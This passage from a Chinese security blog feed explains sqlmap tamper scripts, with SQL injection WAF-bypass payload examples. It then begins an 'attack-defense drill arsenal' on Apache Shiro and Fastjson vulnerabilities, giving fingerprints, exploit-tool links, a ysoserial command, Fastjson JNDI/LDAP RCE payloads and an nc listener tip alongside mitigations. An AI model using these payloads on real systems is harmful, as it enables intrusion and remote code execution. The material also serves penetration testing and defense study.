href="#三、SQLMap中tamper篡改脚本的功能解释" class="headerlink" title="三、SQLMap中tamper篡改脚本的功能解释"></a>三、SQLMap中tamper篡改脚本的功能解释</h1><h2 id="apostrophemask-py"><a href="#apostrophemask-py" class="headerlink" title="apostrophemask.py"></a>apostrophemask.py</h2><p>功能：对引号进行utf-8格式编码(%EF%BC%87)<br>平台：All<br>举例：1 AND ‘1’=’1 ==&gt; 1 AND %EF%BC%871%EF%BC%87=%EF%BC%871</p><h2 id="apostrophenullencode-py"><a href="#apostrophenullencode-py" class="headerlink" title="apostrophenullencode.py"></a>apostrophenullencode.py</h2><p>功能：用非法的双unicode字符(%00%27)替换引号字符<br>平台：All<br>举例：1 AND ‘1’=’1 ==&gt; 1 AND %00%271%00%27=%00%271</p><h2 id="appendnullbyte-py"><a href="#appendnullbyte-py" class="headerlink" title="appendnullbyte.py"></a>appendnullbyte.py</h2><p>功能：在有效载荷结束位置加载零字节字符编码<br>平台：Microsoft Access<br>举例：1 AND 1=1 ==&gt; 1 AND 1=1%00</p><h2 id="base64encode-py"><a href="#base64encode-py" class="headerlink" title="base64encode.py"></a>base64encode.py</h2><p>功能：用base64格式进行编码<br>平台：All<br>举例：1’ AND SLEEP(5)# ==&gt; MScgQU5EIFNMRUVQKDUpIw==</p><h2 id="between-py"><a href="#between-py" class="headerlink" title="between.py"></a>between.py</h2><p>功能：用between替换大于号（&gt;）<br>平台：Mssql2005、MySQL 4/5.0/5.5、Oracle 10g、PostgreSQL 8.3/8.4/9.0<br>举例：<br>1 AND A &gt; B –  ==&gt; 1 AND A NOT BETWEEN 0 AND B  –<br>1 AND A = B –  ==&gt; 1 AND A BETWEEN B AND B –</p><h2 id="bluecoat-py"><a href="#bluecoat-py" class="headerlink" title="bluecoat.py"></a>bluecoat.py</h2><p>功能：对SQL语句替换空格字符为(%09)，并替换”=”—&gt;”LIKE”<br>平台：MySQL 5.1, SGOS<br>举例：SELECT username FROM users WHERE id = 1 ==&gt; SELECT%09username FROM%09users WHERE%09id LIKE 1</p><h2 id="apostrophemask-py-1"><a href="#apostrophemask-py-1" class="headerlink" title="apostrophemask.py"></a>apostrophemask.py</h2><p>功能：用utf-8格式编码引号(如：%EF%BC%87)<br>平台：All<br>举例：1 AND ‘1’=’1 ==&gt; 1 AND %EF%BC%871%EF%BC%87=%EF%BC%871</p><h2 id="charunicodeencode-py"><a href="#charunicodeencode-py" class="headerlink" title="charunicodeencode.py"></a>charunicodeencode.py</h2><p>功能：对字符串进行Unicode格式转义编码<br>平台：Mssql 2000,2005、MySQL 5.1.56、PostgreSQL 9.0.3 ASP/ASP.NET<br>举例：SELECT FIELD%20FROM TABLE ==&gt; %u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045</p><h2 id="charencode-py"><a href="#charencode-py" class="headerlink" title="charencode.py"></a>charencode.py</h2><p>功能：采用url格式编码1次<br>平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>举例：SELECT FIELD FROM%20TABLE ==&gt; %53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45</p><h2 id="chardoubleencode-py"><a href="#chardoubleencode-py" class="headerlink" title="chardoubleencode.py"></a>chardoubleencode.py</h2><p>功能：采用url格式编码2次<br>平台：All<br>举例：SELECT FIELD FROM%20TABLE ==&gt; %2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545</p><h2 id="commalessmid-py"><a href="#commalessmid-py" class="headerlink" title="commalessmid.py"></a>commalessmid.py</h2><p>功能：将payload中的逗号用 from和for代替，用于过滤了逗号并且是3个参数的情况<br>平台：MySQL 5.0, 5.5<br>举例：MID(VERSION(), 1, 1) ==&gt; MID(VERSION() FROM 1 FOR 1)</p><h2 id="concat2concatws-py"><a href="#concat2concatws-py" class="headerlink" title="concat2concatws.py"></a>concat2concatws.py</h2><p>功能：CONCAT() ==&gt; CONCAT_WS()，用于过滤了CONCAT()函数的情况<br>平台： MySQL 5.0<br>举例：CONCAT(1,2) ==&gt; CONCAT_WS(MID(CHAR(0),0,0),1,2)</p><h2 id="equaltolike-py"><a href="#equaltolike-py" class="headerlink" title="equaltolike.py"></a>equaltolike.py</h2><p>功能：= ==&gt; LIKE，用于过滤了等号”=”的情况<br>平台：Mssql 2005、MySQL 4, 5.0 and 5.5<br>举例：SELECT * FROM users WHERE id=1 ==&gt; SELECT * FROM users WHERE id LIKE 1</p><h2 id="greatest-py"><a href="#greatest-py" class="headerlink" title="greatest.py"></a>greatest.py</h2><p>功能：&gt; ==&gt; GREATEST<br>平台：MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>举例：1 AND A &gt; B ==&gt; 1 AND GREATEST(A, B+1)=A<br>a和b+1比较，取两者中的最大值为a；则a &gt;= b+1，亦即a &gt; b</p><h2 id="halfversionedmorekeywords-py"><a href="#halfversionedmorekeywords-py" class="headerlink" title="halfversionedmorekeywords.py"></a>halfversionedmorekeywords.py</h2><p>功能：空格 ==&gt; /<em>!0 （在关键字前添加注释）<br>平台：MySQL 4.0.18, 5.0.22（Mysql &lt; 5.1）<br>举例：union ==&gt; /</em>!0union</p><h2 id="ifnull2ifisnull-py"><a href="#ifnull2ifisnull-py" class="headerlink" title="ifnull2ifisnull.py"></a>ifnull2ifisnull.py</h2><p>功能：IFNULL(A, B) ==&gt; IF(ISNULL(A), B, A)<br>平台：MySQL 5.0 and 5.5<br>举例：IFNULL(1, 2) ==&gt; IF(ISNULL(1),2,1)</p><h2 id="informationschemacomment-py"><a href="#informationschemacomment-py" class="headerlink" title="informationschemacomment.py"></a>informationschemacomment.py</h2><p>功能：<br>在 information_schema 后面加上 /<strong>/ ，用于绕过对 information_schema 的情况<br>retVal = re.sub(r”(?i)(information_schema).”, “g&lt;1&gt;/</strong>/.”, payload)<br>平台：All<br>举例：select table_name from information_schema.tables ==&gt; select table_name from information_schema/**/.tables</p><h2 id="lowercase-py"><a href="#lowercase-py" class="headerlink" title="lowercase.py"></a>lowercase.py</h2><p>功能：将 payload 里的大写转为小写<br>平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>举例：SELECT table_name FROM INFORMATION_SCHEMA.TABLES ==&gt; select table_name from information_schema.tables</p><h2 id="modsecurityversioned-py"><a href="#modsecurityversioned-py" class="headerlink" title="modsecurityversioned.py"></a>modsecurityversioned.py</h2><p>功能：用注释来包围完整的查询语句，用于绕过 ModSecurity 开源 waf<br>平台：MySQL 5.0<br>举例：1 AND 2&gt;1–  ==&gt; 1 /<em>!30874AND 2&gt;1</em>/–</p><h2 id="modsecurityzeroversioned-py"><a href="#modsecurityzeroversioned-py" class="headerlink" title="modsecurityzeroversioned.py"></a>modsecurityzeroversioned.py</h2><p>功能：用注释来包围完整的查询语句，用于绕过 waf ，和上面类似<br>平台：Mysql<br>举例：1 and 2&gt;1–+ ==&gt; 1 /!00000and 2&gt;1/–+</p><h2 id="multiplespaces-py"><a href="#multiplespaces-py" class="headerlink" title="multiplespaces.py"></a>multiplespaces.py</h2><p>功能：围绕SQL关键字添加多个空格<br>平台：All<br>举例：1 UNION SELECT foobar ==&gt; 1   UNION   SELECT   foobar</p><h2 id="nonrecursivereplacement-py"><a href="#nonrecursivereplacement-py" class="headerlink" title="nonrecursivereplacement.py"></a>nonrecursivereplacement.py</h2><p>功能：关键字双写，可用于关键字过滤<br>平台：All<br>举例：1 UNION SELECT 2–  ==&gt; 1 UNIONUNION SELESELECTCT 2–</p><h2 id="overlongutf8-py"><a href="#overlongutf8-py" class="headerlink" title="overlongutf8.py"></a>overlongutf8.py</h2><p>功能： 转换给定的payload当中的所有字符<br>平台：All<br>举例：SELECT FIELD FROM TABLE WHERE 2&gt;1 ==&gt; SELECT%C0%AAFIELD%C0%AAFROM%C0%AATABLE%C0%AAWHERE%C0%AA2%C0%BE1</p><h2 id="percentage-py"><a href="#percentage-py" class="headerlink" title="percentage.py"></a>percentage.py</h2><p>功能：用百分号来绕过关键字过滤，在关键字的每个字母前面都加一个(%)<br>平台：Mssql 2000, 2005、MySQL 5.1.56, 5.5.11、PostgreSQL 9.0<br>举例：SELECT FIELD FROM TABLE ==&gt; %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</p><h2 id="randomcase-py"><a href="#randomcase-py" class="headerlink" title="randomcase.py"></a>randomcase.py</h2><p>功能：将 payload 随机大小写<br>平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>举例：INSERT ==&gt; InseRt</p><h2 id="randomcomments-py"><a href="#randomcomments-py" class="headerlink" title="randomcomments.py"></a>randomcomments.py</h2><p>功能：在 payload 的关键字中间随机插入注释符 /**/ ，可用于绕过关键字过滤<br>平台：Mysql<br>举例：INSERT ==&gt; I / ** / N / ** / SERT</p><h2 id="securesphere-py"><a href="#securesphere-py" class="headerlink" title="securesphere.py"></a>securesphere.py</h2><p>功能：在payload后追加特殊构造的字符串<br>平台：All<br>举例：1 AND 1=1 ==&gt; 1 AND 1=1 and ‘0having’=’0having’</p><h2 id="space2comment-py"><a href="#space2comment-py" class="headerlink" title="space2comment.py"></a>space2comment.py</h2><p>功能：用注释符 // 代替空格，用于空格的绕过<br>平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>举例：SELECT id FROM users ==&gt; SELECT//id//FROM//users</p><h2 id="space2dash-py"><a href="#space2dash-py" class="headerlink" title="space2dash.py"></a>space2dash.py</h2><p>功能：用[注释符(–)+一个随机字符串+一个换行符]替换控制符<br>平台：MSSQL、 SQLite<br>举例：union select 1,2–+ ==&gt; union–HSHjsJh%0Aselect–HhjHSJ%0A1,2–+</p><h2 id="space2hash-py"><a href="#space2hash-py" class="headerlink" title="space2hash.py"></a>space2hash.py</h2><p>功能：用[注释符(#)+一个随机字符串+一个换行符]替换控制符<br>平台：Mysql<br>举例：union select 1,2–+ ==&gt; union%23HSHjsJh%0Aselect%23HhjHSJ%0A1,2–+</p><h2 id="space2morehash-py"><a href="#space2morehash-py" class="headerlink" title="space2morehash.py"></a>space2morehash.py</h2><p>功能：用多个[注释符(#)+一个随机字符串+一个换行符]替换控制符<br>平台：MySQL &gt;= 5.1.13<br>举例：union select 1,2–+ ==&gt; union %23 HSHjsJh %0A select %23 HhjHSJ %0A%23 HJHJhj %0A 1,2–+</p><h2 id="space2mssqlblank-py"><a href="#space2mssqlblank-py" class="headerlink" title="space2mssqlblank.py"></a>space2mssqlblank.py</h2><p>功能：用随机的空白符替换payload中的空格<br>blanks = (‘%01’, ‘%02’, ‘%03’, ‘%04’, ‘%05’, ‘%06’, ‘%07’, ‘%08’, ‘%09’, ‘%0B’, ‘%0C’, ‘%0D’, ‘%0E’, ‘%0F’, ‘%0A’)<br>平台：Mssql 2000,2005<br>举例：SELECT id FROM users ==&gt; SELECT%0Eid%0DFROM%07users</p><h2 id="space2mssqlhash-py"><a href="#space2mssqlhash-py" class="headerlink" title="space2mssqlhash.py"></a>space2mssqlhash.py</h2><p>功能：用[字符# +一个换行符]替换payload中的空格<br>平台：MSSQL、MySQL<br>举例：union select 1,2–+ ==&gt; union%23%0Aselect%23%0A1,2–+</p><h2 id="space2plus-py"><a href="#space2plus-py" class="headerlink" title="space2plus.py"></a>space2plus.py</h2><p>功能：用加号(+)替换空格<br>平台：All<br>举例：SELECT id FROM users ==&gt; SELECT+id+FROM+users</p><h2 id="space2randomblank-py"><a href="#space2randomblank-py" class="headerlink" title="space2randomblank.py"></a>space2randomblank.py</h2><p>功能：用随机的空白符替换payload中的空格<br>平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>举例：SELECT id FROM users ==&gt; SELECT%0Did%0DFROM%0Ausers</p><h2 id="sp-password-py"><a href="#sp-password-py" class="headerlink" title="sp_password.py"></a>sp_password.py</h2><p>功能：在payload语句后添加 sp_password ，用于迷惑数据库日志（Space ==&gt; sp_password）<br>平台：Mssql<br>举例：1 AND 9227=9227–  ==&gt; 1 AND 9227=9227 – sp_password</p><h2 id="symboliclogical-py"><a href="#symboliclogical-py" class="headerlink" title="symboliclogical.py"></a>symboliclogical.py</h2><p>功能：用 &amp;&amp; 替换 and ，用 || 替换 or ，用于这些关键字被过滤的情况<br>平台：All<br>举例：<br>1 and 1=1 ==&gt; 1 %26%26 1=1<br>1 or 1=1 ==&gt; 1 %7c%7c 1=1</p><h2 id="unionalltounion-py"><a href="#unionalltounion-py" class="headerlink" title="unionalltounion.py"></a>unionalltounion.py</h2><p>功能：用 union select 替换union all select<br>平台：All<br>举例：union all select 1,2–+ ==&gt; union select 1,2–+</p><h2 id="unmagicquotes-py"><a href="#unmagicquotes-py" class="headerlink" title="unmagicquotes.py"></a>unmagicquotes.py</h2><p>功能：用宽字符绕过 GPC addslashes<br>平台：All<br>举例：1’ and 1=1 ==&gt; 1%df%27 and 1=1–</p><h2 id="uppercase-py"><a href="#uppercase-py" class="headerlink" title="uppercase.py"></a>uppercase.py</h2><p>功能：将payload中的小写字母转为大写格式<br>平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>举例：insert ==&gt; INSERT</p><h2 id="varnish-py"><a href="#varnish-py" class="headerlink" title="varnish.py"></a>varnish.py</h2><p>功能：添加一个HTTP头“ X-originating-IP ”来绕过WAF<br>平台：headers = kwargs.get(“headers”, {})headers[“X-originating-IP”] = “127.0.0.1”return payload<br>举例：All</p><h2 id="versionedkeywords-py"><a href="#versionedkeywords-py" class="headerlink" title="versionedkeywords.py"></a>versionedkeywords.py</h2><p>功能：对非函数的关键字进行注释<br>平台：MySQL 4.0.18, 5.1.56, 5.5.11<br>举例：1 union select user() ==&gt; 1/!UNION//!SELECT/user()</p><h2 id="versionedmorekeywords-py"><a href="#versionedmorekeywords-py" class="headerlink" title="versionedmorekeywords.py"></a>versionedmorekeywords.py</h2><p>功能：对每个关键字进行注释处理<br>平台：MySQL 5.1.56, 5.5.11<br>举例：1 union select user() ==&gt; 1/!UNION//!SELECT/user()</p><h2 id="xforwardedfor-py"><a href="#xforwardedfor-py" class="headerlink" title="xforwardedfor.py"></a>xforwardedfor.py</h2><p>功能：添加一个伪造的HTTP头“ X-Forwarded-For ”来绕过WAF<br>平台：All<br>举例：headers = kwargs.get(“headers”, {})headers[“X-Forwarded-For”] = randomIP()return payload</p><p>参考来源：<br>[1]SQLMap Tamper Scripts (SQL Injection and WAF bypass) Tips(<a href="https://medium.com/@drag0n/sqlmap-tamper-scripts-sql-injection-and-waf-bypass-c5a3f5764cb3">https://medium.com/@drag0n/sqlmap-tamper-scripts-sql-injection-and-waf-bypass-c5a3f5764cb3</a>)<br>[2]sqlmap的tamper详解(<a href="http://www.myh0st.cn/index.php/archives/881/">http://www.myh0st.cn/index.php/archives/881/</a>)<br>[3]sqlmap-tamper-scripts sqlmap tamper 详解(<a href="http://www.moonsec.com/post-422.html">http://www.moonsec.com/post-422.html</a>)<br>[4]Use SQLMAP To Bypass Cloudflare WAF And Hack Website With SQL Injection(<a href="https://www.sunnyhoi.com/use-sqlmap-to-bypass-cloudflare-waf-and-hack-website-with-sql-injection/">https://www.sunnyhoi.com/use-sqlmap-to-bypass-cloudflare-waf-and-hack-website-with-sql-injection/</a>)<br>[5]Understanding “tamper” option in Sqlmap (II)(<a href="http://0xd0m7.blogspot.com/2016/02/understanding-tamper-option-in-sqlmap-ii.html">http://0xd0m7.blogspot.com/2016/02/understanding-tamper-option-in-sqlmap-ii.html</a>)</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 绕过 </tag>
            
            <tag> waf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020攻防演练弹药库</title>
      <link href="2020/05/11/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E5%BC%B9%E8%8D%AF%E5%BA%93/"/>
      <url>2020/05/11/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E5%BC%B9%E8%8D%AF%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="第一节"><a href="#第一节" class="headerlink" title="第一节"></a>第一节</h1><ol><li><p>漏洞简介</p><h1 id="Apache-Shiro-是企业常见的Java安全框架-其漏洞在2019年攻防演练中起到显著作用"><a href="#Apache-Shiro-是企业常见的Java安全框架-其漏洞在2019年攻防演练中起到显著作用" class="headerlink" title="Apache Shiro 是企业常见的Java安全框架, 其漏洞在2019年攻防演练中起到显著作用"></a>Apache Shiro 是企业常见的Java安全框架, 其漏洞在2019年攻防演练中起到显著作用</h1></li><li><p>影响组件<br>Apache Shiro (由于密钥泄露的问题, 部分高于1.2.4版本的Shiro也会受到影响)</p></li><li><p>漏洞指纹</p><p> set-Cookie: rememberMe=deleteMe</p><p>或者URL中有shiro字样<br>有一些时候服务器不会主动返回 rememberMe=deleteMe, 直接发包即可</p></li><li><p>Fofa Dork</p><pre><code> app=&quot;Apache-Shiro&quot;</code></pre></li><li><p>漏洞分析<br>【漏洞分析】Shiro RememberMe 1.2.4 反序列化导致的命令执行漏洞<br><a href="https://paper.seebug.org/shiro-rememberme-1-2-4/">https://paper.seebug.org/shiro-rememberme-1-2-4/</a></p></li><li><p>漏洞利用<br>wyzxxz/shiro_rce: shiro rce 反序列 命令执行 一键工具<br><a href="https://github.com/wyzxxz/shiro_rce">https://github.com/wyzxxz/shiro_rce</a><br>Apache Shiro回显poc改造计划<br><a href="https://mp.weixin.qq.com/s/-ODg9xL838wro2S_NK30bw">https://mp.weixin.qq.com/s/-ODg9xL838wro2S_NK30bw</a></p></li><li><p>利用技巧</p></li><li><p>使用多个泄露的key进行遍历, 这个在实战中确实有效<br>关于Shiro反序列化漏洞的延伸—升级shiro也能被shell<br><a href="https://mp.weixin.qq.com/s/NRx-rDBEFEbZYrfnRw2iDw">https://mp.weixin.qq.com/s/NRx-rDBEFEbZYrfnRw2iDw</a><br>Shiro 100 Key<br><a href="https://mp.weixin.qq.com/s/sclSe2hWfhv8RZvQCuI8LA">https://mp.weixin.qq.com/s/sclSe2hWfhv8RZvQCuI8LA</a></p></li><li><p>使用 URLDNS 进行检测提速<br>使用适应性最强的URLDNS(这个不受JDK版本和安全策略影响, 除非网络限制不能出DNS)进行检测<br>且可以使用ysoserial提前生成序列化内容<br>java -jar target/ysoserial-0.0.5-SNAPSHOT-all.jar URLDNS “<a href="http://1234567890.test.ceye.io&quot;/">http://1234567890.test.ceye.io&quot;</a> &gt; urldns.ser<br>然后使用占位符+目标url hash的方法修改序列化内容中的urldns地址<br>提高检测速度以及后续检测无需使用ysoserial<br>例如 1234567890.test.ceye.io 可以换成 md5(‘<a href="http://www.qq.com&/#39;).hexdigest()">www.qq.com&#39;).hexdigest()</a> [:10].test.ceye.io<br>也就是 9d2c68d82d.test.ceye.io<br>可以预先记录 hash<br>9d2c68d82d <a href="http://www.qq.com/">www.qq.com</a><br>然后进行hash查表就可以知道是DNSLOG来自哪个目标, 性能会提高不少</p></li><li><p>已知目标使用了Shiro, 可以采取Shiro-721的报错逻辑来进行遍历key — 星光哥<br>这样即使DNS不能出网, 也可以通过是否返回 rememberMe=deleteMe 来断定 shiro key 的正确性, 前提是服务器有rememberMe=deleteMe相关回显</p></li><li><p>防护方法</p></li><li><p>升级Shiro到最新版</p></li><li><p>升级对应JDK版本到 8u191/7u201/6u211/11.0.1 以上</p></li><li><p>WAF拦截Cookie中长度过大的rememberMe值</p><h1 id="Apache-Shiro-Padding-Oracle-Attack-Shiro-721"><a href="#Apache-Shiro-Padding-Oracle-Attack-Shiro-721" class="headerlink" title="Apache Shiro Padding Oracle Attack (Shiro-721)"></a>Apache Shiro Padding Oracle Attack (Shiro-721)</h1></li><li><p>漏洞简介<br>Apache Shiro 是企业常见的 Java安全框架, 由于Shiro使用AES-CBC模式进行加解密处理, 所以存在Padding Oracle Attack漏洞, 已经登录的攻击者同样可以进行反序列化操作</p></li><li><p>影响组件</p><pre><code>     Apache Shiro &lt; 1.4.2</code></pre></li><li><p>漏洞指纹<br>set-Cookie: rememberMe=deleteMe<br>URL中有shiro字样<br>有一些时候服务器不会主动返回 rememberMe=deleteMe, 直接发包即可</p></li><li><p>Fofa Dork</p><pre><code>     app=&quot;Apache-Shiro&quot;</code></pre></li><li><p>漏洞分析<br>Shiro 721 Padding Oracle攻击漏洞分析 – 安全客, 安全资讯平台<br><a href="https://www.anquanke.com/post/id/193165">https://www.anquanke.com/post/id/193165</a><br>Apache Shiro 远程代码执行漏洞复现 – OnionT’s Blog<br><a href="http://www.oniont.cn/index.php/archives/298.html">http://www.oniont.cn/index.php/archives/298.html</a></p></li><li><p>漏洞利用<br>wuppp/shiro_rce_exp: Shiro RCE (Padding Oracle Attack)<br><a href="https://github.com/wuppp/shiro_rce_exp">https://github.com/wuppp/shiro_rce_exp</a></p></li><li><p>利用技巧</p></li><li><p>该漏洞需要登录后获取到合法的Cookie: rememberMe=XXX后才可以进行利用, 看起来不是很好利用<br>但实际上有一些网站是开放注册的, 而且这个洞不需要知道服务端密钥<br>所以后续的利用还是可以同Shiro-550一样利用, 而且这里是AES加密的, 自带过WAF属性</p></li><li><p>如果攻击没有生效, 可以试一下删除Cookie中的JSESSIONID 字段, 很多时候这个字段存在的话, 服务端不会去处理 rememberMe</p></li><li><p>防护方法</p></li><li><p>升级Shiro到最新版</p></li><li><p>升级对应JDK版本到 8u191/7u201/6u211/11.0.1 以上</p></li><li><p>WAF拦截Cookie中长度过大的rememberMe值</p></li><li><p>WAF拦截访问过于频繁的IP, 因为该漏洞需要爆破Cookie</p><h1 id="Apache-Shiro-权限绕过漏洞-Shiro-682"><a href="#Apache-Shiro-权限绕过漏洞-Shiro-682" class="headerlink" title="Apache Shiro 权限绕过漏洞 (Shiro-682)"></a>Apache Shiro 权限绕过漏洞 (Shiro-682)</h1></li><li><p>漏洞简介<br>Apache Shiro 是企业常见的Java安全框架, 由于Shiro的拦截器和spring(Servlet)拦截器对于URI模式匹配的差异, 导致出现鉴权问题</p></li><li><p>影响组件</p><p> Apache Shiro &lt; 1.5.2</p></li><li><p>漏洞指纹</p><p> set-Cookie: rememberMe=deleteMe<br>或者URL中有shiro字样<br>有一些时候服务器不会主动返回 rememberMe=deleteMe, 直接发包即可</p></li><li><p>Fofa Dork<br>app=”Apache-Shiro”</p></li><li><p>漏洞分析<br>Shiro 权限绕过漏洞分析（CVE-2020-1957） – 斗象能力中心<br><a href="https://blog.riskivy.com/shiro-%e6%9d%83%e9%99%90%e7%bb%95%e8%bf%87%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%ef%bc%88cve-2020-1957%ef%bc%89/">https://blog.riskivy.com/shiro-%e6%9d%83%e9%99%90%e7%bb%95%e8%bf%87%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%ef%bc%88cve-2020-1957%ef%bc%89/</a></p></li><li><p>漏洞利用<br>Shiro 权限绕过漏洞分析（CVE-2020-1957） – 斗象能力中心<br><a href="https://blog.riskivy.com/shiro-%e6%9d%83%e9%99%90%e7%bb%95%e8%bf%87%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%ef%bc%88cve-2020-1957%ef%bc%89/">https://blog.riskivy.com/shiro-%e6%9d%83%e9%99%90%e7%bb%95%e8%bf%87%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%ef%bc%88cve-2020-1957%ef%bc%89/</a></p></li><li><p>利用技巧</p></li><li><p>url中间可以尝试添加 ../ , 不限于这个漏洞, 可能会有惊喜, 错误的Nginx配置也会造成新的漏洞<br>关于url解析的问题可以参考以下链接<br>A New Era of SSRF – Exploiting URL Parser in Trending Programming Languages!<br><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf</a><br>Tomcat URL解析差异性导致的安全问题 – 先知社区<br><a href="https://xz.aliyun.com/t/7544">https://xz.aliyun.com/t/7544</a></p></li><li><p>防护方法</p></li><li><p>升级1.5.2版本及以上</p></li><li><p>尽量避免使用*通配符作为动态路由拦截器的URL路径表达式.</p><h1 id="Fastjson-反序列化远程代码执行漏洞"><a href="#Fastjson-反序列化远程代码执行漏洞" class="headerlink" title="Fastjson 反序列化远程代码执行漏洞"></a>Fastjson 反序列化远程代码执行漏洞</h1></li><li><p>漏洞简介<br>Fastjosn 无疑是这两年的漏洞之王, 一手反序列化RCE影响无数厂商, 目前1.2.48以下版本稳定受影响, 1.2.68以下版本开启Autotype会受到影响<br>(不排除传说中的1.2.67以下RCE漏洞, 期待八仙过海)</p></li><li><p>影响组件<br>Fastjson &lt; 1.2.48 (&lt;1.2.68?)</p></li><li><p>漏洞指纹<br>可以通过DNS回显的方式检测后端是否使用Fastjson</p></li></ol><pre><code>&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;, &quot;val&quot;:&quot;dnslog&quot;&#125;&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;, &quot;val&quot;:&quot;dnslog&quot;&#125;&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:, &quot;val&quot;:&quot;dnslog&quot;&#125;&#125;&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;&#125;&#125;&quot;&quot;&#125;&#123;&#123;"@type":"java.net.URL", "val":"dnslog"&#125;:"aaa"&#125;    Set[&#123;"@type":"java.net.URL", "val":"dnslog"&#125;]    Set[&#123;"@type":"java.net.URL", "val":"dnslog"&#125;    &#123;&#123;"@type":"java.net.URL", "val":"dnslog"&#125;:0可以通过DOS时间延迟或者报错回显的方式检测无损检测Fastjson DoS漏洞以及盲区分Fastjson与Jackson组件 – 斗象能力中心 (<1.2.60)https://blog.riskivy.com/%e6%97%a0%e6%8d%9f%e6%a3%80%e6%b5%8bfastjson-dos%e6%bc%8f%e6%b4%9e%e4%bb%a5%e5%8f%8a%e7%9b%b2%e5%8c%ba%e5%88%86fastjson%e4%b8%8ejackson%e7%bb%84%e4%bb%b6/fastjson < 1.2.66 版本最新漏洞分析https://mp.weixin.qq.com/s/RShHui_TJeZM7-frzCfH7Q4. Fofa Dork5. 漏洞分析Fastjson <=1.2.47 远程代码执行漏洞分析 – 安全客, 安全资讯平台https://www.anquanke.com/post/id/1818746. 漏洞利用1.JDK降级编译CaijiOrz/fastjson-1.2.47-RCE: Fastjson <= 1.2.47 远程命令执行漏洞利用工具及方法https://github.com/CaijiOrz/fastjson-1.2.47-RCE源项目中最后一句当javac版本和目标服务器差太多, 会报一个这样得到错误, 所以需要使用1.8的javac来编译Exploit.java这里并不需要更换jdk版本, 我们可以使用JDK降级编译的手法, 这样1.8的jdk也可以编译出来1.7版本的.class , 相信可以解决很多小伙伴的问题javac -source 1.7 -target 1.7 Exploit.java1.2.47版本以下通杀Poc:    &#123;"name":&#123;"@type":"java.lang.Class", "val":"com.sun.rowset.JdbcRowSetImpl"&#125;, "f":&#123;"@type":"com.sun.rowset.JdbcRowSetImpl", "dataSourceName":"ldap://asdfasfd/", "autoCommit":true&#125;&#125;, age:11&#125;其中&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;ldap://asdfasfd/&quot;, &quot;autoCommit&quot;:true&#125;也可以替换成其他利用链</code></pre><p>2.优先使用LDAP协议<br>根据实战中经验, 这里更推荐使用ldap协议进行漏洞利用, 原因如下<br>RMI协议的利用方式 在JDK 6u132/7u122/8u113 及以上版本中修复了<br>LDAP协议的利用方式 在JDK 6u211/7u201/8u191 及以上版本中修复了<br>所以,LDAP的利用方式要优于RMI, 且LDAP可以直接返回序列化对象, 绕过更高版本的JDK限制<br>如何绕过高版本JDK的限制进行JNDI注入 – FreeBuf专栏·安全引擎<br><a href="https://www.freebuf.com/column/207439.html">https://www.freebuf.com/column/207439.html</a><br>7. 利用技巧<br>1.如何查看服务器的jdk版本呢, 这里也有个小技巧<br>nc -lvvp 80#[marshalsec中指定的HTTP端口]<br>当服务器连接过来时, User-Agent中会标明当前服务器的JDK版本<br>2.当发现一台Redis的数据中有@type字样时, 意味着autotype大概率是开的, 只要不存在黑名单中的利用链都可以用#[同理可以用在jackson上]<br>fastjson/GenericFastJsonRedisSerializer.java at master · alibaba/fastjson<br><a href="https://github.com/alibaba/fastjson/blob/master/src/main/java/com/alibaba/fastjson/support/spring/GenericFastJsonRedisSerializer.java">https://github.com/alibaba/fastjson/blob/master/src/main/java/com/alibaba/fastjson/support/spring/GenericFastJsonRedisSerializer.java</a></p><pre><code>public class GenericFastJsonRedisSerializer implements RedisSerializer&lt;Object&gt; &#123;private final static ParserConfig defaultRedisConfig = new ParserConfig();static &#123; defaultRedisConfig.setAutoTypeSupport(true);&#125;</code></pre><p>其他消息队列之类的都是同理<br>8. 防护方法<br>1.升级Fastjson到最新版(&gt;=1.2.68 